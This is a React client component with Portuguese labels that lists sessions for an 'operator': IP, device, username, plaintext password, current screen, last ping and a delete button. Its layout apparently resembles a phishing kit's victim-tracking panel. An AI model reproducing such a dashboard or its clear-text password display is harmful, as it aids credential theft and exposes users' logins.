"use client";

import { Button } from "@/components/ui/button";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { deleteSession, useAllSectionResumed } from "@/hooks/useOperador";
import { IconTrash } from "@tabler/icons-react";

export default function HistoryTable() {
  const { data, isLoading, isError, refetch } = useAllSectionResumed();

  if (isLoading) return <p>Carregando sessões...</p>;
  if (isError) return <p>Erro ao carregar sessões.</p>;

  const sessions = data?.data ?? [];

  return (
    <div style={{ padding: 20 }}>
      <Table>
        <TableHeader>
          <TableRow>
            <TableHead className="w-[100px]">IP</TableHead>
            <TableHead>Device</TableHead>
            <TableHead>Usuário</TableHead>
            <TableHead className="">Senha</TableHead>
            <TableHead className="">Status</TableHead>
            <TableHead className="">Tela</TableHead>
            <TableHead className="">Último Ping</TableHead>
            <TableHead className="">Ação</TableHead>
          </TableRow>
        </TableHeader>
        <TableBody>
          {sessions.map((s) => (
            <TableRow key={s.sessionId}>
              <TableCell>{s.ipAddress}</TableCell>
              <TableCell>{s.device}</TableCell>
              <TableCell>{s.clientUser?.usuario ?? "-"}</TableCell>
              <TableCell>{s.clientUser?.senha ?? "-"}</TableCell>
              <TableCell>{s.data?.status ?? "-"}</TableCell>
              <TableCell>{s.data?.screen ?? "-"}</TableCell>
              <TableCell>
                {s.data?.lastPing
                  ? new Date(s.data.lastPing).toLocaleString("pt-BR")
                  : "-"}
              </TableCell>
              <TableCell>
                <Button
                  onClick={async () => {
                    try {
                      await deleteSession(s.sessionId);
                      await refetch(); // atualiza a lista após excluir
                    } catch (e: any) {
                      alert(e.message);
                    }
                  }}
                >
                  <IconTrash />
                  Excluir
                </Button>
              </TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </div>
  );
}
